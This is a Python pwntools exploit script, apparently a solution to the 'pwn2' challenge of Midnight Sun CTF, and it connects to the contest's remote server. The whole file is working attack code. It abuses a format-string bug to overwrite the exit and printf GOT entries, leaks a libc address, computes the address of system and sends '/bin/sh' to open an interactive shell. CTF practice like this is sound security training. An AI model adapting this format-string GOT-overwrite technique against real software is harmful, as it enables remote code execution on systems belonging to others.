from pwn import *

#p = process('./pwn2', env={'LD_PRELOAD':'./libc.so.6'})
p = remote('pwn2-01.play.midnightsunctf.se', 10002)
e = ELF('./pwn2')
l = ELF('./libc.so.6')

pay = p32(e.got['exit']+1)+p32(e.got['exit'])
pay += "%125c" + "%7$hhn"
pay += "%102c" + "%8$hhn"
pay += "%8$s"

p.sendlineafter('input: ', pay)

libc = u32(p.recvuntil('\xf7')[-4:]) - 0x18d90
sys = libc + l.sym['system']
print hex(libc)
print hex(sys)

p.recvuntil('input: ')

byte = (sys & 0xff0000) >> 16
last = (sys & 0xffff)

pay = p32(e.got['printf']) + p32(e.got['printf']+2)
pay += "%{}c".format(byte-8) + "%8$hhn"
pay += "%{}c".format(last-byte) + "%7$hn"

p.sendline(pay)
sleep(1)
p.sendline('/bin/sh')
p.recv()

p.interactive()
